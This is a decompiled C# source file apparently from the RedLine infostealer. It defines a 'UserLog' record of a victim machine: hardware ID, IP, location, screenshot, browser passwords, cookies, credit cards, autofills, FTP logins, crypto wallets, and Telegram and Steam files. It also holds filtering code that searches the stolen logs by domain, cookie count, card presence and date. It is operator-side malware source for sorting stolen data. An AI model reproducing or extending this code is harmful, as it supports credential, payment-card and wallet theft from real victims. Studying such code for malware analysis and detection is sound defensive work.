using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization;
using ProtoBuf;

namespace RedLine.SharedModels;

[ProtoContract(Name = "UserLog")]
[DataContract(Name = "Entity7", Namespace = "Entity")]
public struct UserLog
{
	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass103_0
	{
		public string domain;

		internal bool method_0(LoginPair x)
		{
			return x.Host?.Contains(domain) ?? false;
		}
	}

	[CompilerGenerated]
	private sealed class _003CPasswordContains_003Ed__103 : IEnumerable<string>, IEnumerator<string>, IDisposable, IEnumerable, IEnumerator
	{
		private IntPtr intptr_0;

		private object object_0;

		private IntPtr intptr_1;

		private object object_1;

		public IEnumerable<string> _003C_003E3__links;

		public UserLog _003C_003E4__this;

		public UserLog _003C_003E3___003C_003E4__this;

		private object object_2;

		private object object_3;

		string IEnumerator<string>.Current
		{
			[DebuggerHidden]
			get
			{
				return (string)object_0;
			}
		}

		object IEnumerator.Current
		{
			[DebuggerHidden]
			get
			{
				return object_0;
			}
		}

		[DebuggerHidden]
		public _003CPasswordContains_003Ed__103(int _003C_003E1__state)
		{
			intptr_0 = (IntPtr)_003C_003E1__state;
			intptr_1 = (IntPtr)Environment.CurrentManagedThreadId;
		}

		[DebuggerHidden]
		void IDisposable.Dispose()
		{
			int num = (int)(nint)intptr_0;
			if (num == -3 || num == 1)
			{
				try
				{
				}
				finally
				{
					method_0();
				}
			}
		}

		private bool MoveNext()
		{
			try
			{
				switch ((int)(nint)intptr_0)
				{
				case 0:
					intptr_0 = (IntPtr)(-1);
					if (object_1 != null)
					{
						object_2 = _003C_003E4__this.Credentials.Browsers?.Where((Browser x) => x.Credentials != null)?.SelectMany((Browser x) => x.Credentials);
						if (object_2 == null)
						{
							return false;
						}
						if (((IEnumerable<LoginPair>)object_2).Count() == 0)
						{
							return false;
						}
						object_3 = ((IEnumerable<string>)object_1).GetEnumerator();
						intptr_0 = (IntPtr)(-3);
						break;
					}
					return false;
				default:
					return false;
				case 1:
					intptr_0 = (IntPtr)(-3);
					break;
				}
				_003C_003Ec__DisplayClass103_0 CS_0024_003C_003E8__locals0;
				int num;
				while (true)
				{
					if (((IEnumerator)object_3).MoveNext())
					{
						CS_0024_003C_003E8__locals0 = new _003C_003Ec__DisplayClass103_0
						{
							domain = ((IEnumerator<string>)object_3).Current
						};
						if (!string.IsNullOrWhiteSpace(CS_0024_003C_003E8__locals0.domain))
						{
							num = ((IEnumerable<LoginPair>)object_2).Count((LoginPair x) => x.Host?.Contains(CS_0024_003C_003E8__locals0.domain) ?? false);
							if (num > 0)
							{
								break;
							}
						}
						continue;
					}
					method_0();
					object_3 = null;
					return false;
				}
				object_0 = CS_0024_003C_003E8__locals0.domain + $" ({num})";
				intptr_0 = (IntPtr)1;
				return true;
			}
			catch
			{
				//try-fault
				((IDisposable)this).Dispose();
				throw;
			}
		}

		bool IEnumerator.MoveNext()
		{
			//ILSpy generated this explicit interface implementation from .override directive in MoveNext
			return this.MoveNext();
		}

		private void method_0()
		{
			intptr_0 = (IntPtr)(-1);
			if (object_3 != null)
			{
				((IDisposable)object_3).Dispose();
			}
		}

		[DebuggerHidden]
		void IEnumerator.Reset()
		{
			throw new NotSupportedException();
		}

		[DebuggerHidden]
		IEnumerator<string> IEnumerable<string>.GetEnumerator()
		{
			_003CPasswordContains_003Ed__103 _003CPasswordContains_003Ed__;
			if (intptr_0 == (IntPtr)(-2) && intptr_1 == (IntPtr)Environment.CurrentManagedThreadId)
			{
				intptr_0 = (IntPtr)0;
				_003CPasswordContains_003Ed__ = this;
			}
			else
			{
				_003CPasswordContains_003Ed__ = new _003CPasswordContains_003Ed__103(0);
			}
			_003CPasswordContains_003Ed__._003C_003E4__this = _003C_003E3___003C_003E4__this;
			_003CPasswordContains_003Ed__.object_1 = _003C_003E3__links;
			return _003CPasswordContains_003Ed__;
		}

		[DebuggerHidden]
		IEnumerator IEnumerable.GetEnumerator()
		{
			return ((IEnumerable<string>)this).GetEnumerator();
		}
	}

	[CompilerGenerated]
	private sealed class _003C_003Ec__DisplayClass104_0
	{
		public string domain;

		internal bool method_0(Cookie x)
		{
			return x.Host?.Contains(domain) ?? false;
		}
	}

	[CompilerGenerated]
	private sealed class _003CCookiesContains_003Ed__104 : IEnumerable<string>, IEnumerator<string>, IDisposable, IEnumerable, IEnumerator
	{
		private IntPtr intptr_0;

		private object object_0;

		private IntPtr intptr_1;

		private object object_1;

		public IEnumerable<string> _003C_003E3__links;

		public UserLog _003C_003E4__this;

		public UserLog _003C_003E3___003C_003E4__this;

		private object object_2;

		private object object_3;

		string IEnumerator<string>.Current
		{
			[DebuggerHidden]
			get
			{
				return (string)object_0;
			}
		}

		object IEnumerator.Current
		{
			[DebuggerHidden]
			get
			{
				return object_0;
			}
		}

		[DebuggerHidden]
		public _003CCookiesContains_003Ed__104(int _003C_003E1__state)
		{
			intptr_0 = (IntPtr)_003C_003E1__state;
			intptr_1 = (IntPtr)Environment.CurrentManagedThreadId;
		}

		[DebuggerHidden]
		void IDisposable.Dispose()
		{
			int num = (int)(nint)intptr_0;
			if (num == -3 || num == 1)
			{
				try
				{
				}
				finally
				{
					method_0();
				}
			}
		}

		private bool MoveNext()
		{
			try
			{
				_003C_003Ec__DisplayClass104_0 CS_0024_003C_003E8__locals0;
				int num;
				switch ((int)(nint)intptr_0)
				{
				default:
					return false;
				case 1:
					intptr_0 = (IntPtr)(-3);
					goto IL_011e;
				case 0:
					{
						intptr_0 = (IntPtr)(-1);
						if (object_1 == null)
						{
							return false;
						}
						object_2 = _003C_003E4__this.Credentials.Browsers?.Where((Browser x) => x.Cookies != null)?.SelectMany((Browser x) => x.Cookies);
						if (object_2 == null)
						{
							return false;
						}
						if (((IEnumerable<Cookie>)object_2).Count() != 0)
						{
							object_3 = ((IEnumerable<string>)object_1).GetEnumerator();
							intptr_0 = (IntPtr)(-3);
							goto IL_011e;
						}
						return false;
					}
					IL_011e:
					while (true)
					{
						if (((IEnumerator)object_3).MoveNext())
						{
							CS_0024_003C_003E8__locals0 = new _003C_003Ec__DisplayClass104_0
							{
								domain = ((IEnumerator<string>)object_3).Current
							};
							if (!string.IsNullOrWhiteSpace(CS_0024_003C_003E8__locals0.domain))
							{
								num = ((IEnumerable<Cookie>)object_2).Count((Cookie x) => x.Host?.Contains(CS_0024_003C_003E8__locals0.domain) ?? false);
								if (num > 0)
								{
									break;
								}
							}
							continue;
						}
						method_0();
						object_3 = null;
						return false;
					}
					object_0 = CS_0024_003C_003E8__locals0.domain + $" ({num})";
					intptr_0 = (IntPtr)1;
					return true;
				}
			}
			catch
			{
				//try-fault
				((IDisposable)this).Dispose();
				throw;
			}
		}

		bool IEnumerator.MoveNext()
		{
			//ILSpy generated this explicit interface implementation from .override directive in MoveNext
			return this.MoveNext();
		}

		private void method_0()
		{
			intptr_0 = (IntPtr)(-1);
			if (object_3 != null)
			{
				((IDisposable)object_3).Dispose();
			}
		}

		[DebuggerHidden]
		void IEnumerator.Reset()
		{
			throw new NotSupportedException();
		}

		[DebuggerHidden]
		IEnumerator<string> IEnumerable<string>.GetEnumerator()
		{
			_003CCookiesContains_003Ed__104 _003CCookiesContains_003Ed__;
			if (intptr_0 == (IntPtr)(-2) && intptr_1 == (IntPtr)Environment.CurrentManagedThreadId)
			{
				intptr_0 = (IntPtr)0;
				_003CCookiesContains_003Ed__ = this;
			}
			else
			{
				_003CCookiesContains_003Ed__ = new _003CCookiesContains_003Ed__104(0);
			}
			_003CCookiesContains_003Ed__._003C_003E4__this = _003C_003E3___003C_003E4__this;
			_003CCookiesContains_003Ed__.object_1 = _003C_003E3__links;
			return _003CCookiesContains_003Ed__;
		}

		[DebuggerHidden]
		IEnumerator IEnumerable.GetEnumerator()
		{
			return ((IEnumerable<string>)this).GetEnumerator();
		}
	}

	[ProtoMember(1, Name = "ID")]
	public int ID { get; set; }

	[DataMember(Name = "Id1")]
	[ProtoMember(2, Name = "HWID")]
	public string HWID { get; set; }

	[ProtoMember(3, Name = "BuildID")]
	[DataMember(Name = "Id2")]
	public string BuildID { get; set; }

	[DataMember(Name = "Id3")]
	[ProtoMember(4, Name = "Username")]
	public string Username { get; set; }

	[ProtoMember(5, Name = "IsProcessElevated")]
	public bool IsProcessElevated { get; set; }

	[DataMember(Name = "Id4")]
	[ProtoMember(6, Name = "OS")]
	public string OS { get; set; }

	[DataMember(Name = "Id5")]
	[ProtoMember(7, Name = "CurrentLanguage")]
	public string CurrentLanguage { get; set; }

	[DataMember(Name = "Id6")]
	[ProtoMember(8, Name = "MonitorSize")]
	public string MonitorSize { get; set; }

	[ProtoMember(9, Name = "LogDate")]
	public DateTime LogDate { get; set; }

	[ProtoMember(10, Name = "AdminPromptType")]
	public AdminPromptType UacType { get; set; }

	[ProtoMember(15, Name = "Credentials")]
	[DataMember(Name = "Id7")]
	public Credentials Credentials { get; set; }

	[DataMember(Name = "Id8")]
	[ProtoMember(11, Name = "Country")]
	public string Country { get; set; }

	[ProtoMember(12, Name = "Location")]
	[DataMember(Name = "Id9")]
	public string Location { get; set; }

	[ProtoMember(13, Name = "TimeZone")]
	[DataMember(Name = "Id10")]
	public string TimeZone { get; set; }

	[DataMember(Name = "Id11")]
	[ProtoMember(14, Name = "IP")]
	public string IP { get; set; }

	[DataMember(Name = "Id12")]
	[ProtoMember(16, Name = "Screenshot")]
	public byte[] Screenshot { get; set; }

	[ProtoMember(17, Name = "Comment")]
	public string Comment { get; set; }

	[ProtoMember(19, Name = "PDD")]
	public string PDD { get; set; }

	[ProtoMember(20, Name = "CDD")]
	public string CDD { get; set; }

	[ProtoMember(21, Name = "Exceptions")]
	public List<string> Exceptions { get; set; }

	[ProtoMember(23, Name = "Creds")]
	public string Creds { get; set; }

	[DataMember(Name = "Id13")]
	[ProtoMember(24, Name = "PostalCode")]
	public string PostalCode { get; set; }

	[ProtoMember(25, Name = "Checked")]
	public bool Checked { get; set; }

	[ProtoMember(26, Name = "FileLocation")]
	[DataMember(Name = "Id14")]
	public string FileLocation { get; set; }

	[DataMember(Name = "Id15")]
	[ProtoMember(27, Name = "SeenBefore")]
	public bool SeenBefore { get; set; }

	public bool IsMatch(SingleSearchParams searchParams, bool calcing = false)
	{
		bool result = false;
		try
		{
			int num = 0;
			if (!string.IsNullOrWhiteSpace(searchParams.FilesToSearch))
			{
				if (!IsMatch("Files=" + searchParams.FilesToSearch))
				{
					return false;
				}
				num++;
			}
			else
			{
				num++;
			}
			if (string.IsNullOrWhiteSpace(searchParams.Comment))
			{
				num++;
			}
			else
			{
				if (!IsMatch("Comment=" + searchParams.Comment))
				{
					return false;
				}
				num++;
			}
			if (string.IsNullOrWhiteSpace(searchParams.SkipComment))
			{
				num++;
			}
			else
			{
				if (IsMatch("Comment=" + searchParams.SkipComment))
				{
					return false;
				}
				num++;
			}
			if (!string.IsNullOrWhiteSpace(searchParams.BuildID))
			{
				if (!IsMatch("BuildID=" + searchParams.BuildID))
				{
					return false;
				}
				num++;
			}
			else
			{
				num++;
			}
			if (!string.IsNullOrWhiteSpace(searchParams.OS))
			{
				if (!searchParams.OS.Contains(OS))
				{
					return false;
				}
				num++;
			}
			else
			{
				num++;
			}
			if (string.IsNullOrWhiteSpace(searchParams.Country))
			{
				num++;
			}
			else
			{
				if (!IsMatch("Country=" + searchParams.Country))
				{
					return false;
				}
				num++;
			}
			if (!searchParams.ContainsAFs)
			{
				num++;
			}
			else
			{
				IList<Browser> browsers = Credentials.Browsers;
				if (browsers == null || !browsers.Where(delegate(Browser x)
				{
					IList<Autofill> autofills = x.Autofills;
					return autofills != null && autofills.Count > 0;
				}).Any())
				{
					return false;
				}
				num++;
			}
			if (!searchParams.ContainsCCs)
			{
				num++;
			}
			else
			{
				IList<Browser> browsers2 = Credentials.Browsers;
				if (browsers2 == null || !browsers2.Where(delegate(Browser x)
				{
					IList<CreditCard> creditCards = x.CreditCards;
					return creditCards != null && creditCards.Count > 0;
				}).Any())
				{
					return false;
				}
				num++;
			}
			if (searchParams.SkipCookies)
			{
				IList<Browser> browsers3 = Credentials.Browsers;
				if (browsers3 == null || !browsers3.Where(delegate(Browser x)
				{
					IList<Cookie> cookies = x.Cookies;
					return cookies != null && cookies.Count > 0;
				}).Any())
				{
					return false;
				}
				num++;
			}
			else
			{
				num++;
			}
			if (searchParams.SkipPasswords)
			{
				IList<Browser> browsers4 = Credentials.Browsers;
				if (browsers4 == null || !browsers4.Where(delegate(Browser x)
				{
					IList<LoginPair> credentials = x.Credentials;
					return credentials != null && credentials.Count > 0;
				}).Any())
				{
					return false;
				}
				num++;
			}
			else
			{
				num++;
			}
			if (searchParams.SkipChecked)
			{
				if (Checked)
				{
					return false;
				}
				num++;
			}
			else
			{
				num++;
			}
			if (!searchParams.ContainsFiles)
			{
				num++;
			}
			else
			{
				IList<RemoteFile> files = Credentials.Files;
				if (files == null || files.Count <= 0)
				{
					return false;
				}
				num++;
			}
			if (!searchParams.ContainsFTPs)
			{
				num++;
			}
			else
			{
				IList<LoginPair> ftpConnections = Credentials.FtpConnections;
				if (ftpConnections == null || ftpConnections.Count <= 0)
				{
					return false;
				}
				num++;
			}
			if (searchParams.ContainsWallets)
			{
				IList<RemoteFile> coldWallets = Credentials.ColdWallets;
				if (coldWallets == null || coldWallets.Count <= 0)
				{
					return false;
				}
				num++;
			}
			else
			{
				num++;
			}
			if (searchParams.ContainsTelegram)
			{
				IList<RemoteFile> telegramFiles = Credentials.TelegramFiles;
				if (telegramFiles == null || telegramFiles.Count <= 0)
				{
					return false;
				}
				num++;
			}
			else
			{
				num++;
			}
			if (!searchParams.ContainsSteam)
			{
				num++;
			}
			else
			{
				IList<RemoteFile> steamFiles = Credentials.SteamFiles;
				if (steamFiles == null || steamFiles.Count <= 0)
				{
					return false;
				}
				num++;
			}
			if (calcing)
			{
				if (!CookiesContains(searchParams.PasswordDomain) && !PasswordContains(searchParams.PasswordDomain))
				{
					return false;
				}
				num++;
				num++;
			}
			else
			{
				if (!string.IsNullOrWhiteSpace(searchParams.CookieDomain))
				{
					if (!CookiesContains(searchParams.CookieDomain))
					{
						return false;
					}
					num++;
				}
				else
				{
					num++;
				}
				if (string.IsNullOrWhiteSpace(searchParams.PasswordDomain))
				{
					num++;
				}
				else
				{
					if (!PasswordContains(searchParams.PasswordDomain))
					{
						return false;
					}
					num++;
				}
			}
			if (Convert.ToInt32(Creds.Split('|')[0]) > searchParams.PasswordsMoreThan)
			{
				num++;
				if (Convert.ToInt32(Creds.Split('|')[1]) <= searchParams.PasswordsMoreThan)
				{
					return false;
				}
				num++;
				if (LogDate >= searchParams.LogFrom && LogDate <= searchParams.LogTo)
				{
					num++;
				}
				return num == 21;
			}
			return false;
		}
		catch (Exception)
		{
			return result;
		}
	}

	public bool IsMatch(string filter)
	{
		try
		{
			if (string.IsNullOrWhiteSpace(filter))
			{
				return true;
			}
			string[] array = filter.Split(';');
			if (array.Length == 0)
			{
				array = new string[1] { filter };
			}
			int num = array.Length;
			int num2 = 0;
			PropertyInfo[] properties = GetType().GetProperties();
			string[] array2 = array;
			int num3 = 0;
			while (true)
			{
				if (num3 < array2.Length)
				{
					string[] array3 = array2[num3].Split('=');
					if (array3.Length < 2)
					{
						break;
					}
					if (!string.IsNullOrWhiteSpace(array3[0]) && !string.IsNullOrWhiteSpace(array3[1]))
					{
						string text = array3[0];
						string text2 = array3[1];
						switch (text)
						{
						case "Files":
						{
							IList<RemoteFile> files = Credentials.Files;
							if (files == null || files.Count <= 0)
							{
								break;
							}
							string[] array5 = text2.Split('|');
							foreach (string value3 in array5)
							{
								foreach (RemoteFile file in Credentials.Files)
								{
									if (!string.IsNullOrWhiteSpace(file.FileName) && file.FileName.Contains(value3))
									{
										num2++;
									}
								}
							}
							break;
						}
						case "CDD":
						{
							string[] array5 = text2.Split('|');
							foreach (string value in array5)
							{
								if (CDD.Contains(value))
								{
									num2++;
								}
							}
							break;
						}
						default:
						{
							PropertyInfo[] array6 = properties;
							foreach (PropertyInfo propertyInfo in array6)
							{
								if (!(propertyInfo.Name == text))
								{
									continue;
								}
								string text3 = propertyInfo.GetValue(this).ToString();
								string[] array7 = text2.Split(',');
								if (array7.Length == 0 && text3 == text2)
								{
									num2++;
									continue;
								}
								string[] array5 = array7;
								foreach (string text4 in array5)
								{
									if (!string.IsNullOrWhiteSpace(text4) && text3 == text4)
									{
										num2++;
									}
								}
							}
							break;
						}
						case "PDD":
						{
							string[] array5 = text2.Split('|');
							foreach (string value2 in array5)
							{
								if (PDD.Contains(value2))
								{
									num2++;
								}
							}
							break;
						}
						case "LogDate":
						{
							string[] array4 = text2.Split('-');
							DateTime dateTime = default(DateTime);
							DateTime dateTime2 = default(DateTime);
							if (array4 != null && array4.Length < 2)
							{
								dateTime = DateTime.ParseExact(text2, "dd.MM.yyyy HH:mm", null);
								dateTime2 = DateTime.Now;
								if (LogDate >= dateTime && LogDate <= dateTime2)
								{
									num2++;
								}
							}
							else if (array4 != null && array4.Length == 2)
							{
								dateTime = (string.IsNullOrWhiteSpace(array4[0].Trim()) ? DateTime.MinValue : DateTime.ParseExact(array4[0].Trim(), "dd.MM.yyyy HH:mm", null));
								dateTime2 = (string.IsNullOrWhiteSpace(array4[1].Trim()) ? DateTime.MaxValue : DateTime.ParseExact(array4[1].Trim(), "dd.MM.yyyy HH:mm", null));
								if (LogDate >= dateTime && LogDate <= dateTime2)
								{
									num2++;
								}
							}
							break;
						}
						}
						num3++;
						continue;
					}
					return false;
				}
				return num2 >= num;
			}
			return false;
		}
		catch
		{
		}
		return false;
	}

	public bool PasswordContains(string domains)
	{
		if (string.IsNullOrWhiteSpace(domains))
		{
			return true;
		}
		string[] array = domains.Split(new string[1] { "|" }, StringSplitOptions.RemoveEmptyEntries);
		if (array != null && array.Length == 0)
		{
			return true;
		}
		IEnumerable<LoginPair> enumerable = Credentials.Browsers?.Where((Browser x) => x.Credentials != null)?.SelectMany((Browser x) => x.Credentials);
		if (enumerable != null)
		{
			if (enumerable.Count() == 0)
			{
				return false;
			}
			string[] array2 = array;
			foreach (string text in array2)
			{
				try
				{
					string[] domainSplit = text.Split(':');
					if (domainSplit.Length == 1 && enumerable.Any((LoginPair x) => x.Host?.Contains(domainSplit[0]) ?? false))
					{
						return true;
					}
					if (domainSplit.Length != 2 || !(enumerable.Where((LoginPair x) => x.Host?.Contains(domainSplit[0]) ?? false)?.Count() >= Convert.ToInt32(domainSplit[1])))
					{
						continue;
					}
					return true;
				}
				catch
				{
				}
			}
			return false;
		}
		return false;
	}

	[IteratorStateMachine(typeof(_003CPasswordContains_003Ed__103))]
	public IEnumerable<string> PasswordContains(IEnumerable<string> links)
	{
		//yield-return decompiler failed: Could not find stateField
		return new _003CPasswordContains_003Ed__103(-2)
		{
			_003C_003E3___003C_003E4__this = this,
			_003C_003E3__links = links
		};
	}

	[IteratorStateMachine(typeof(_003CCookiesContains_003Ed__104))]
	public IEnumerable<string> CookiesContains(IEnumerable<string> links)
	{
		//yield-return decompiler failed: Could not find stateField
		return new _003CCookiesContains_003Ed__104(-2)
		{
			_003C_003E3___003C_003E4__this = this,
			_003C_003E3__links = links
		};
	}

	public bool CookiesContains(string domains)
	{
		if (string.IsNullOrWhiteSpace(domains))
		{
			return true;
		}
		string[] array = domains.Split(new string[1] { "|" }, StringSplitOptions.RemoveEmptyEntries);
		if (array != null && array.Length == 0)
		{
			return true;
		}
		IEnumerable<Cookie> enumerable = Credentials.Browsers?.Where((Browser x) => x.Cookies != null)?.SelectMany((Browser x) => x.Cookies);
		if (enumerable != null)
		{
			if (enumerable.Count() != 0)
			{
				string[] array2 = array;
				foreach (string text in array2)
				{
					try
					{
						string[] domainSplit = text.Split(':');
						if (domainSplit.Length == 1 && enumerable.Any((Cookie x) => x.Host.Contains(domainSplit[0])))
						{
							return true;
						}
						if (domainSplit.Length == 2 && enumerable.Where((Cookie x) => x.Host.Contains(domainSplit[0]))?.Count() >= Convert.ToInt32(domainSplit[1]))
						{
							return true;
						}
					}
					catch
					{
					}
				}
				return false;
			}
			return false;
		}
		return false;
	}
}
